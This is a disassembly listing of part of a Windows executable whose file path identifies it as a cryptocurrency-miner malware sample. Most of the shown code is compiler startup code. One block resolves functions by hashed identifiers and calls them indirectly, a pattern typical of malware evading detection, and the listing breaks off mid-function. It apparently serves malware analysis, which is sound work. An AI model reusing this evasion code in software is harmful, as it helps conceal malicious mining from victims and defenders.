
malware_samples/miner/7cf4e952263f348a6cf37fc84468613af0311e6eb87ea7494e07204f149bbf0c.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	56                   	push   %rsi
   140001001:	48 83 ec 20          	sub    $0x20,%rsp
   140001005:	48 8b 05 1c a0 00 00 	mov    0xa01c(%rip),%rax        # 0x14000b028
   14000100c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001012:	48 8b 05 17 a0 00 00 	mov    0xa017(%rip),%rax        # 0x14000b030
   140001019:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000101f:	48 8b 05 12 a0 00 00 	mov    0xa012(%rip),%rax        # 0x14000b038
   140001026:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000102c:	48 8b 0d d5 9f 00 00 	mov    0x9fd5(%rip),%rcx        # 0x14000b008
   140001033:	0f b7 11             	movzwl (%rcx),%edx
   140001036:	31 c0                	xor    %eax,%eax
   140001038:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   14000103e:	75 4b                	jne    0x14000108b
   140001040:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140001044:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000104b:	75 3e                	jne    0x14000108b
   14000104d:	48 01 d1             	add    %rdx,%rcx
   140001050:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
   140001054:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000105a:	74 17                	je     0x140001073
   14000105c:	81 fa 0b 01 00 00    	cmp    $0x10b,%edx
   140001062:	75 27                	jne    0x14000108b
   140001064:	83 79 74 0f          	cmpl   $0xf,0x74(%rcx)
   140001068:	72 21                	jb     0x14000108b
   14000106a:	48 81 c1 e8 00 00 00 	add    $0xe8,%rcx
   140001071:	eb 10                	jmp    0x140001083
   140001073:	83 b9 84 00 00 00 0f 	cmpl   $0xf,0x84(%rcx)
   14000107a:	72 0f                	jb     0x14000108b
   14000107c:	48 81 c1 f8 00 00 00 	add    $0xf8,%rcx
   140001083:	31 c0                	xor    %eax,%eax
   140001085:	83 39 00             	cmpl   $0x0,(%rcx)
   140001088:	0f 95 c0             	setne  %al
   14000108b:	48 8b 0d 8e 9f 00 00 	mov    0x9f8e(%rip),%rcx        # 0x14000b020
   140001092:	83 39 01             	cmpl   $0x1,(%rcx)
   140001095:	89 05 f9 f0 2b 00    	mov    %eax,0x2bf0f9(%rip)        # 0x1402c0194
   14000109b:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400010a0:	83 d9 00             	sbb    $0x0,%ecx
   1400010a3:	e8 a8 94 00 00       	call   0x14000a550
   1400010a8:	48 8b 05 d9 9f 00 00 	mov    0x9fd9(%rip),%rax        # 0x14000b088
   1400010af:	8b 30                	mov    (%rax),%esi
   1400010b1:	e8 0a 0f 00 00       	call   0x140001fc0
   1400010b6:	89 30                	mov    %esi,(%rax)
   1400010b8:	48 8b 05 b9 9f 00 00 	mov    0x9fb9(%rip),%rax        # 0x14000b078
   1400010bf:	8b 30                	mov    (%rax),%esi
   1400010c1:	e8 ea 0e 00 00       	call   0x140001fb0
   1400010c6:	89 30                	mov    %esi,(%rax)
   1400010c8:	e8 83 06 00 00       	call   0x140001750
   1400010cd:	48 8b 05 2c 9f 00 00 	mov    0x9f2c(%rip),%rax        # 0x14000b000
   1400010d4:	83 38 01             	cmpl   $0x1,(%rax)
   1400010d7:	75 0c                	jne    0x1400010e5
   1400010d9:	48 8d 0d 20 07 00 00 	lea    0x720(%rip),%rcx        # 0x140001800
   1400010e0:	e8 1b 0d 00 00       	call   0x140001e00
   1400010e5:	31 c0                	xor    %eax,%eax
   1400010e7:	48 83 c4 20          	add    $0x20,%rsp
   1400010eb:	5e                   	pop    %rsi
   1400010ec:	c3                   	ret
   1400010ed:	0f 1f 00             	nopl   (%rax)
   1400010f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010f4:	48 8b 05 95 9f 00 00 	mov    0x9f95(%rip),%rax        # 0x14000b090
   1400010fb:	8b 00                	mov    (%rax),%eax
   1400010fd:	89 05 95 f0 2b 00    	mov    %eax,0x2bf095(%rip)        # 0x1402c0198
   140001103:	48 8d 05 8e f0 2b 00 	lea    0x2bf08e(%rip),%rax        # 0x1402c0198
   14000110a:	48 8b 0d 6f 9f 00 00 	mov    0x9f6f(%rip),%rcx        # 0x14000b080
   140001111:	44 8b 09             	mov    (%rcx),%r9d
   140001114:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001119:	48 8d 0d 7c f0 2b 00 	lea    0x2bf07c(%rip),%rcx        # 0x1402c019c
   140001120:	48 8d 15 79 f0 2b 00 	lea    0x2bf079(%rip),%rdx        # 0x1402c01a0
   140001127:	4c 8d 05 7a f0 2b 00 	lea    0x2bf07a(%rip),%r8        # 0x1402c01a8
   14000112e:	e8 0d 94 00 00       	call   0x14000a540
   140001133:	90                   	nop
   140001134:	48 83 c4 28          	add    $0x28,%rsp
   140001138:	c3                   	ret
   140001139:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001140:	48 83 ec 28          	sub    $0x28,%rsp
   140001144:	48 8b 05 d5 9e 00 00 	mov    0x9ed5(%rip),%rax        # 0x14000b020
   14000114b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001151:	e8 0a 00 00 00       	call   0x140001160
   140001156:	90                   	nop
   140001157:	90                   	nop
   140001158:	90                   	nop
   140001159:	48 83 c4 28          	add    $0x28,%rsp
   14000115d:	c3                   	ret
   14000115e:	66 90                	xchg   %ax,%ax
   140001160:	41 57                	push   %r15
   140001162:	41 56                	push   %r14
   140001164:	56                   	push   %rsi
   140001165:	57                   	push   %rdi
   140001166:	53                   	push   %rbx
   140001167:	48 83 ec 20          	sub    $0x20,%rsp
   14000116b:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001172:	00 00 
   140001174:	48 8b 78 08          	mov    0x8(%rax),%rdi
   140001178:	48 8b 35 c9 9e 00 00 	mov    0x9ec9(%rip),%rsi        # 0x14000b048
   14000117f:	31 c0                	xor    %eax,%eax
   140001181:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   140001186:	0f 94 c3             	sete   %bl
   140001189:	74 2e                	je     0x1400011b9
   14000118b:	48 39 c7             	cmp    %rax,%rdi
   14000118e:	74 29                	je     0x1400011b9
   140001190:	4c 8b 35 91 c3 00 00 	mov    0xc391(%rip),%r14        # 0x14000d528
   140001197:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000119e:	00 00 
   1400011a0:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011a5:	41 ff d6             	call   *%r14
   1400011a8:	31 c0                	xor    %eax,%eax
   1400011aa:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   1400011af:	0f 94 c3             	sete   %bl
   1400011b2:	74 05                	je     0x1400011b9
   1400011b4:	48 39 c7             	cmp    %rax,%rdi
   1400011b7:	75 e7                	jne    0x1400011a0
   1400011b9:	48 8b 3d 90 9e 00 00 	mov    0x9e90(%rip),%rdi        # 0x14000b050
   1400011c0:	8b 07                	mov    (%rdi),%eax
   1400011c2:	83 f8 01             	cmp    $0x1,%eax
   1400011c5:	75 0c                	jne    0x1400011d3
   1400011c7:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400011cc:	e8 8f 93 00 00       	call   0x14000a560
   1400011d1:	eb 27                	jmp    0x1400011fa
   1400011d3:	83 3f 00             	cmpl   $0x0,(%rdi)
   1400011d6:	74 09                	je     0x1400011e1
   1400011d8:	c6 05 d1 ef 2b 00 01 	movb   $0x1,0x2befd1(%rip)        # 0x1402c01b0
   1400011df:	eb 19                	jmp    0x1400011fa
   1400011e1:	c7 07 01 00 00 00    	movl   $0x1,(%rdi)
   1400011e7:	48 8b 0d 7a 9e 00 00 	mov    0x9e7a(%rip),%rcx        # 0x14000b068
   1400011ee:	48 8b 15 7b 9e 00 00 	mov    0x9e7b(%rip),%rdx        # 0x14000b070
   1400011f5:	e8 86 93 00 00       	call   0x14000a580
   1400011fa:	8b 07                	mov    (%rdi),%eax
   1400011fc:	83 f8 01             	cmp    $0x1,%eax
   1400011ff:	75 19                	jne    0x14000121a
   140001201:	48 8b 0d 50 9e 00 00 	mov    0x9e50(%rip),%rcx        # 0x14000b058
   140001208:	48 8b 15 51 9e 00 00 	mov    0x9e51(%rip),%rdx        # 0x14000b060
   14000120f:	e8 6c 93 00 00       	call   0x14000a580
   140001214:	c7 07 02 00 00 00    	movl   $0x2,(%rdi)
   14000121a:	84 db                	test   %bl,%bl
   14000121c:	74 05                	je     0x140001223
   14000121e:	31 c0                	xor    %eax,%eax
   140001220:	48 87 06             	xchg   %rax,(%rsi)
   140001223:	48 8b 05 e6 9d 00 00 	mov    0x9de6(%rip),%rax        # 0x14000b010
   14000122a:	48 8b 00             	mov    (%rax),%rax
   14000122d:	48 85 c0             	test   %rax,%rax
   140001230:	74 10                	je     0x140001242
   140001232:	31 c9                	xor    %ecx,%ecx
   140001234:	ba 02 00 00 00       	mov    $0x2,%edx
   140001239:	45 31 c0             	xor    %r8d,%r8d
   14000123c:	ff 15 c6 1d 2c 00    	call   *0x2c1dc6(%rip)        # 0x1402c3008
   140001242:	e8 39 06 00 00       	call   0x140001880
   140001247:	48 8d 0d c2 0b 00 00 	lea    0xbc2(%rip),%rcx        # 0x140001e10
   14000124e:	ff 15 cc c2 00 00    	call   *0xc2cc(%rip)        # 0x14000d520
   140001254:	48 8b 0d e5 9d 00 00 	mov    0x9de5(%rip),%rcx        # 0x14000b040
   14000125b:	48 89 01             	mov    %rax,(%rcx)
   14000125e:	48 8d 0d 2b 01 00 00 	lea    0x12b(%rip),%rcx        # 0x140001390
   140001265:	e8 26 0d 00 00       	call   0x140001f90
   14000126a:	e8 01 06 00 00       	call   0x140001870
   14000126f:	48 63 3d 26 ef 2b 00 	movslq 0x2bef26(%rip),%rdi        # 0x1402c019c
   140001276:	48 8d 0c fd 08 00 00 	lea    0x8(,%rdi,8),%rcx
   14000127d:	00 
   14000127e:	e8 2d 93 00 00       	call   0x14000a5b0
   140001283:	48 89 c6             	mov    %rax,%rsi
   140001286:	48 85 ff             	test   %rdi,%rdi
   140001289:	7e 47                	jle    0x1400012d2
   14000128b:	89 fb                	mov    %edi,%ebx
   14000128d:	4c 8b 35 0c ef 2b 00 	mov    0x2bef0c(%rip),%r14        # 0x1402c01a0
   140001294:	45 31 ff             	xor    %r15d,%r15d
   140001297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000129e:	00 00 
   1400012a0:	4b 8b 0c fe          	mov    (%r14,%r15,8),%rcx
   1400012a4:	e8 27 93 00 00       	call   0x14000a5d0
   1400012a9:	48 8d 78 01          	lea    0x1(%rax),%rdi
   1400012ad:	48 89 f9             	mov    %rdi,%rcx
   1400012b0:	e8 fb 92 00 00       	call   0x14000a5b0
   1400012b5:	4a 89 04 fe          	mov    %rax,(%rsi,%r15,8)
   1400012b9:	4b 8b 14 fe          	mov    (%r14,%r15,8),%rdx
   1400012bd:	48 89 c1             	mov    %rax,%rcx
   1400012c0:	49 89 f8             	mov    %rdi,%r8
   1400012c3:	e8 f8 92 00 00       	call   0x14000a5c0
   1400012c8:	49 ff c7             	inc    %r15
   1400012cb:	4c 39 fb             	cmp    %r15,%rbx
   1400012ce:	75 d0                	jne    0x1400012a0
   1400012d0:	eb 02                	jmp    0x1400012d4
   1400012d2:	31 db                	xor    %ebx,%ebx
   1400012d4:	48 c7 04 de 00 00 00 	movq   $0x0,(%rsi,%rbx,8)
   1400012db:	00 
   1400012dc:	48 89 35 bd ee 2b 00 	mov    %rsi,0x2beebd(%rip)        # 0x1402c01a0
   1400012e3:	e8 d8 03 00 00       	call   0x1400016c0
   1400012e8:	48 8b 05 b9 ee 2b 00 	mov    0x2beeb9(%rip),%rax        # 0x1402c01a8
   1400012ef:	48 8b 0d 22 9d 00 00 	mov    0x9d22(%rip),%rcx        # 0x14000b018
   1400012f6:	48 8b 09             	mov    (%rcx),%rcx
   1400012f9:	48 89 01             	mov    %rax,(%rcx)
   1400012fc:	8b 0d 9a ee 2b 00    	mov    0x2bee9a(%rip),%ecx        # 0x1402c019c
   140001302:	48 8b 15 97 ee 2b 00 	mov    0x2bee97(%rip),%rdx        # 0x1402c01a0
   140001309:	4c 8b 05 98 ee 2b 00 	mov    0x2bee98(%rip),%r8        # 0x1402c01a8
   140001310:	e8 0b 29 00 00       	call   0x140003c20
   140001315:	89 05 99 ee 2b 00    	mov    %eax,0x2bee99(%rip)        # 0x1402c01b4
   14000131b:	83 3d 72 ee 2b 00 00 	cmpl   $0x0,0x2bee72(%rip)        # 0x1402c0194
   140001322:	74 20                	je     0x140001344
   140001324:	80 3d 85 ee 2b 00 00 	cmpb   $0x0,0x2bee85(%rip)        # 0x1402c01b0
   14000132b:	75 0b                	jne    0x140001338
   14000132d:	e8 3e 92 00 00       	call   0x14000a570
   140001332:	8b 05 7c ee 2b 00    	mov    0x2bee7c(%rip),%eax        # 0x1402c01b4
   140001338:	48 83 c4 20          	add    $0x20,%rsp
   14000133c:	5b                   	pop    %rbx
   14000133d:	5f                   	pop    %rdi
   14000133e:	5e                   	pop    %rsi
   14000133f:	41 5e                	pop    %r14
   140001341:	41 5f                	pop    %r15
   140001343:	c3                   	ret
   140001344:	89 c1                	mov    %eax,%ecx
   140001346:	e8 55 92 00 00       	call   0x14000a5a0
   14000134b:	cc                   	int3
   14000134c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001350:	48 83 ec 28          	sub    $0x28,%rsp
   140001354:	48 8b 05 c5 9c 00 00 	mov    0x9cc5(%rip),%rax        # 0x14000b020
   14000135b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001361:	e8 fa fd ff ff       	call   0x140001160
   140001366:	90                   	nop
   140001367:	90                   	nop
   140001368:	90                   	nop
   140001369:	48 83 c4 28          	add    $0x28,%rsp
   14000136d:	c3                   	ret
   14000136e:	66 90                	xchg   %ax,%ax
   140001370:	48 83 ec 28          	sub    $0x28,%rsp
   140001374:	e8 17 92 00 00       	call   0x14000a590
   140001379:	31 c9                	xor    %ecx,%ecx
   14000137b:	48 83 f8 01          	cmp    $0x1,%rax
   14000137f:	19 c9                	sbb    %ecx,%ecx
   140001381:	89 c8                	mov    %ecx,%eax
   140001383:	48 83 c4 28          	add    $0x28,%rsp
   140001387:	c3                   	ret
   140001388:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000138f:	00 
   140001390:	c3                   	ret
   140001391:	cc                   	int3
   140001392:	cc                   	int3
   140001393:	cc                   	int3
   140001394:	58                   	pop    %rax
   140001395:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000139a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000139f:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400013a4:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400013a9:	48 83 ec 28          	sub    $0x28,%rsp
   1400013ad:	8b 0d 4d cc 00 00    	mov    0xcc4d(%rip),%ecx        # 0x14000e000
   1400013b3:	e8 18 8d 00 00       	call   0x14000a0d0
   1400013b8:	89 05 4e cc 00 00    	mov    %eax,0xcc4e(%rip)        # 0x14000e00c
   1400013be:	48 31 c9             	xor    %rcx,%rcx
   1400013c1:	e8 ba 8f 00 00       	call   0x14000a380
   1400013c6:	48 89 05 43 cc 00 00 	mov    %rax,0xcc43(%rip)        # 0x14000e010
   1400013cd:	48 31 c0             	xor    %rax,%rax
   1400013d0:	8b 05 36 cc 00 00    	mov    0xcc36(%rip),%eax        # 0x14000e00c
   1400013d6:	48 83 c4 28          	add    $0x28,%rsp
   1400013da:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1400013df:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   1400013e4:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1400013e9:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400013ee:	49 89 ca             	mov    %rcx,%r10
   1400013f1:	8f 05 0d cc 00 00    	pop    0xcc0d(%rip)        # 0x14000e004
   1400013f7:	ff 15 13 cc 00 00    	call   *0xcc13(%rip)        # 0x14000e010
   1400013fd:	ff 35 01 cc 00 00    	push   0xcc01(%rip)        # 0x14000e004
   140001403:	c3                   	ret
   140001404:	c7 05 f2 cb 00 00 90 	movl   $0x82953f90,0xcbf2(%rip)        # 0x14000e000
   14000140b:	3f 95 82 
   14000140e:	e8 81 ff ff ff       	call   0x140001394
   140001413:	c7 05 e3 cb 00 00 d2 	movl   $0xdc1a9ed2,0xcbe3(%rip)        # 0x14000e000
   14000141a:	9e 1a dc 
   14000141d:	e8 72 ff ff ff       	call   0x140001394
   140001422:	c7 05 d4 cb 00 00 fd 	movl   $0xa3d7ccfd,0xcbd4(%rip)        # 0x14000e000
   140001429:	cc d7 a3 
   14000142c:	e8 63 ff ff ff       	call   0x140001394
   140001431:	c7 05 c5 cb 00 00 b2 	movl   $0x578c1b2,0xcbc5(%rip)        # 0x14000e000
   140001438:	c1 78 05 
   14000143b:	e8 54 ff ff ff       	call   0x140001394
   140001440:	c7 05 b6 cb 00 00 e2 	movl   $0x2bb90be2,0xcbb6(%rip)        # 0x14000e000
   140001447:	0b b9 2b 
   14000144a:	e8 45 ff ff ff       	call   0x140001394
   14000144f:	c7 05 a7 cb 00 00 67 	movl   $0xb697e467,0xcba7(%rip)        # 0x14000e000
   140001456:	e4 97 b6 
   140001459:	e8 36 ff ff ff       	call   0x140001394
   14000145e:	c7 05 98 cb 00 00 86 	movl   $0xc90b6486,0xcb98(%rip)        # 0x14000e000
   140001465:	64 0b c9 
   140001468:	e8 27 ff ff ff       	call   0x140001394
   14000146d:	c7 05 89 cb 00 00 32 	movl   $0xcbf5f932,0xcb89(%rip)        # 0x14000e000
   140001474:	f9 f5 cb 
   140001477:	e8 18 ff ff ff       	call   0x140001394
   14000147c:	c7 05 7a cb 00 00 20 	movl   $0xd1241020,0xcb7a(%rip)        # 0x14000e000
   140001483:	10 24 d1 
   140001486:	e8 09 ff ff ff       	call   0x140001394
   14000148b:	c7 05 6b cb 00 00 33 	movl   $0x7fb50533,0xcb6b(%rip)        # 0x14000e000
   140001492:	05 b5 7f 
   140001495:	e8 fa fe ff ff       	call   0x140001394
   14000149a:	c7 05 5c cb 00 00 c4 	movl   $0x546f7cc4,0xcb5c(%rip)        # 0x14000e000
   1400014a1:	7c 6f 54 
   1400014a4:	e8 eb fe ff ff       	call   0x140001394
   1400014a9:	c7 05 4d cb 00 00 3f 	movl   $0xf92efd3f,0xcb4d(%rip)        # 0x14000e000
   1400014b0:	fd 2e f9 
   1400014b3:	e8 dc fe ff ff       	call   0x140001394
   1400014b8:	c7 05 3e cb 00 00 12 	movl   $0x6d73a112,0xcb3e(%rip)        # 0x14000e000
   1400014bf:	a1 73 6d 
   1400014c2:	e8 cd fe ff ff       	call   0x140001394
   1400014c7:	c7 05 2f cb 00 00 6d 	movl   $0x8d51b96d,0xcb2f(%rip)        # 0x14000e000
   1400014ce:	b9 51 8d 
   1400014d1:	e8 be fe ff ff       	call   0x140001394
   1400014d6:	c7 05 20 cb 00 00 57 	movl   $0xd76e8157,0xcb20(%rip)        # 0x14000e000
   1400014dd:	81 6e d7 
   1400014e0:	e8 af fe ff ff       	call   0x140001394
   1400014e5:	c7 05 11 cb 00 00 0a 	movl   $0x94eef20a,0xcb11(%rip)        # 0x14000e000
   1400014ec:	f2 ee 94 
   1400014ef:	e8 a0 fe ff ff       	call   0x140001394
   1400014f4:	c7 05 02 cb 00 00 7d 	movl   $0x30502b7d,0xcb02(%rip)        # 0x14000e000
   1400014fb:	2b 50 30 
   1400014fe:	e8 91 fe ff ff       	call   0x140001394
   140001503:	c7 05 f3 ca 00 00 9d 	movl   $0xec175b9d,0xcaf3(%rip)        # 0x14000e000
   14000150a:	5b 17 ec 
   14000150d:	e8 82 fe ff ff       	call   0x140001394
   140001512:	c7 05 e4 ca 00 00 19 	movl   $0xdc11dc19,0xcae4(%rip)        # 0x14000e000
   140001519:	dc 11 dc 
   14000151c:	e8 73 fe ff ff       	call   0x140001394
   140001521:	c7 05 d5 ca 00 00 0e 	movl   $0x5b20700e,0xcad5(%rip)        # 0x14000e000
   140001528:	70 20 5b 
   14000152b:	e8 64 fe ff ff       	call   0x140001394
   140001530:	c7 05 c6 ca 00 00 c6 	movl   $0x524757c6,0xcac6(%rip)        # 0x14000e000
   140001537:	57 47 52 
   14000153a:	e8 55 fe ff ff       	call   0x140001394
   14000153f:	c7 05 b7 ca 00 00 99 	movl   $0xc0e34899,0xcab7(%rip)        # 0x14000e000
   140001546:	48 e3 c0 
   140001549:	e8 46 fe ff ff       	call   0x140001394
   14000154e:	c7 05 a8 ca 00 00 a9 	movl   $0xcdf462a9,0xcaa8(%rip)        # 0x14000e000
   140001555:	62 f4 cd 
   140001558:	e8 37 fe ff ff       	call   0x140001394
   14000155d:	c7 05 99 ca 00 00 33 	movl   $0x3fb33a33,0xca99(%rip)        # 0x14000e000
   140001564:	3a b3 3f 
   140001567:	e8 28 fe ff ff       	call   0x140001394
   14000156c:	c7 05 8a ca 00 00 85 	movl   $0xfa2ab85,0xca8a(%rip)        # 0x14000e000
   140001573:	ab a2 0f 
   140001576:	e8 19 fe ff ff       	call   0x140001394
   14000157b:	c7 05 7b ca 00 00 ff 	movl   $0xff1199ff,0xca7b(%rip)        # 0x14000e000
   140001582:	99 11 ff 
   140001585:	e8 0a fe ff ff       	call   0x140001394
   14000158a:	c7 05 6c ca 00 00 25 	movl   $0xb1413e25,0xca6c(%rip)        # 0x14000e000
   140001591:	3e 41 b1 
   140001594:	e8 fb fd ff ff       	call   0x140001394
   140001599:	c7 05 5d ca 00 00 8f 	movl   $0x8b06928f,0xca5d(%rip)        # 0x14000e000
   1400015a0:	92 06 8b 
   1400015a3:	e8 ec fd ff ff       	call   0x140001394
   1400015a8:	c7 05 4e ca 00 00 11 	movl   $0x7a82a211,0xca4e(%rip)        # 0x14000e000
   1400015af:	a2 82 7a 
   1400015b2:	e8 dd fd ff ff       	call   0x140001394
   1400015b7:	c7 05 3f ca 00 00 87 	movl   $0x2e412187,0xca3f(%rip)        # 0x14000e000
   1400015be:	21 41 2e 
   1400015c1:	e8 ce fd ff ff       	call   0x140001394
   1400015c6:	c7 05 30 ca 00 00 82 	movl   $0x89d55b82,0xca30(%rip)        # 0x14000e000
   1400015cd:	5b d5 89 
   1400015d0:	e8 bf fd ff ff       	call   0x140001394
   1400015d5:	c7 05 21 ca 00 00 ca 	movl   $0x7f3e11ca,0xca21(%rip)        # 0x14000e000
   1400015dc:	11 3e 7f 
   1400015df:	e8 b0 fd ff ff       	call   0x140001394
   1400015e4:	c7 05 12 ca 00 00 c6 	movl   $0x10e01dc6,0xca12(%rip)        # 0x14000e000
   1400015eb:	1d e0 10 
   1400015ee:	e8 a1 fd ff ff       	call   0x140001394
   1400015f3:	cc                   	int3
   1400015f4:	cc                   	int3
   1400015f5:	cc                   	int3
   1400015f6:	cc                   	int3
   1400015f7:	cc                   	int3
   1400015f8:	cc                   	int3
   1400015f9:	cc                   	int3
   1400015fa:	cc                   	int3
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	48 83 ec 28          	sub    $0x28,%rsp
   140001604:	48 8b 05 0d ca 00 00 	mov    0xca0d(%rip),%rax        # 0x14000e018
   14000160b:	48 8b 00             	mov    (%rax),%rax
   14000160e:	48 85 c0             	test   %rax,%rax
   140001611:	74 2e                	je     0x140001641
   140001613:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000161a:	84 00 00 00 00 00 
   140001620:	ff 15 e2 19 2c 00    	call   *0x2c19e2(%rip)        # 0x1402c3008
   140001626:	48 8b 05 eb c9 00 00 	mov    0xc9eb(%rip),%rax        # 0x14000e018
   14000162d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001631:	48 89 0d e0 c9 00 00 	mov    %rcx,0xc9e0(%rip)        # 0x14000e018
   140001638:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000163c:	48 85 c0             	test   %rax,%rax
   14000163f:	75 df                	jne    0x140001620
   140001641:	48 83 c4 28          	add    $0x28,%rsp
   140001645:	c3                   	ret
   140001646:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000164d:	00 00 00 
   140001650:	56                   	push   %rsi
   140001651:	57                   	push   %rdi
   140001652:	53                   	push   %rbx
   140001653:	48 83 ec 20          	sub    $0x20,%rsp
   140001657:	48 8b 35 3a 9a 00 00 	mov    0x9a3a(%rip),%rsi        # 0x14000b098
   14000165e:	8b 06                	mov    (%rsi),%eax
   140001660:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001663:	75 17                	jne    0x14000167c
   140001665:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000166a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001670:	8d 48 02             	lea    0x2(%rax),%ecx
   140001673:	ff c0                	inc    %eax
   140001675:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000167a:	75 f4                	jne    0x140001670
   14000167c:	85 c0                	test   %eax,%eax
   14000167e:	74 25                	je     0x1400016a5
   140001680:	89 c7                	mov    %eax,%edi
   140001682:	48 ff cf             	dec    %rdi
   140001685:	48 89 fb             	mov    %rdi,%rbx
   140001688:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000168f:	00 
   140001690:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001695:	ff 15 6d 19 2c 00    	call   *0x2c196d(%rip)        # 0x1402c3008
   14000169b:	48 ff cb             	dec    %rbx
   14000169e:	85 ff                	test   %edi,%edi
   1400016a0:	48 89 df             	mov    %rbx,%rdi
   1400016a3:	75 eb                	jne    0x140001690
   1400016a5:	48 8d 0d 54 ff ff ff 	lea    -0xac(%rip),%rcx        # 0x140001600
   1400016ac:	48 83 c4 20          	add    $0x20,%rsp
   1400016b0:	5b                   	pop    %rbx
   1400016b1:	5f                   	pop    %rdi
   1400016b2:	5e                   	pop    %rsi
   1400016b3:	e9 b8 fc ff ff       	jmp    0x140001370
   1400016b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400016bf:	00 
   1400016c0:	56                   	push   %rsi
   1400016c1:	57                   	push   %rdi
   1400016c2:	53                   	push   %rbx
   1400016c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400016c7:	80 3d ea ea 2b 00 00 	cmpb   $0x0,0x2beaea(%rip)        # 0x1402c01b8
   1400016ce:	74 08                	je     0x1400016d8
   1400016d0:	48 83 c4 20          	add    $0x20,%rsp
   1400016d4:	5b                   	pop    %rbx
   1400016d5:	5f                   	pop    %rdi
   1400016d6:	5e                   	pop    %rsi
   1400016d7:	c3                   	ret
   1400016d8:	c6 05 d9 ea 2b 00 01 	movb   $0x1,0x2bead9(%rip)        # 0x1402c01b8
   1400016df:	48 8b 35 b2 99 00 00 	mov    0x99b2(%rip),%rsi        # 0x14000b098
   1400016e6:	8b 06                	mov    (%rsi),%eax
   1400016e8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400016eb:	75 1f                	jne    0x14000170c
   1400016ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400016f2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400016f9:	1f 84 00 00 00 00 00 
   140001700:	8d 48 02             	lea    0x2(%rax),%ecx
   140001703:	ff c0                	inc    %eax
   140001705:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000170a:	75 f4                	jne    0x140001700
   14000170c:	85 c0                	test   %eax,%eax
   14000170e:	74 25                	je     0x140001735
   140001710:	89 c7                	mov    %eax,%edi
   140001712:	48 ff cf             	dec    %rdi
   140001715:	48 89 fb             	mov    %rdi,%rbx
   140001718:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000171f:	00 
   140001720:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001725:	ff 15 dd 18 2c 00    	call   *0x2c18dd(%rip)        # 0x1402c3008
   14000172b:	48 ff cb             	dec    %rbx
   14000172e:	85 ff                	test   %edi,%edi
   140001730:	48 89 df             	mov    %rbx,%rdi
   140001733:	75 eb                	jne    0x140001720
   140001735:	48 8d 0d c4 fe ff ff 	lea    -0x13c(%rip),%rcx        # 0x140001600
   14000173c:	48 83 c4 20          	add    $0x20,%rsp
   140001740:	5b                   	pop    %rbx
   140001741:	5f                   	pop    %rdi
   140001742:	5e                   	pop    %rsi
   140001743:	e9 28 fc ff ff       	jmp    0x140001370
   140001748:	cc                   	int3
   140001749:	cc                   	int3
   14000174a:	cc                   	int3
   14000174b:	cc                   	int3
   14000174c:	cc                   	int3
   14000174d:	cc                   	int3
   14000174e:	cc                   	int3
   14000174f:	cc                   	int3
   140001750:	31 c0                	xor    %eax,%eax
   140001752:	c3                   	ret
   140001753:	cc                   	int3
   140001754:	cc                   	int3
   140001755:	cc                   	int3
   140001756:	cc                   	int3
   140001757:	cc                   	int3
   140001758:	cc                   	int3
   140001759:	cc                   	int3
   14000175a:	cc                   	int3
   14000175b:	cc                   	int3
   14000175c:	cc                   	int3
   14000175d:	cc                   	int3
   14000175e:	cc                   	int3
   14000175f:	cc                   	int3
   140001760:	56                   	push   %rsi
   140001761:	57                   	push   %rdi
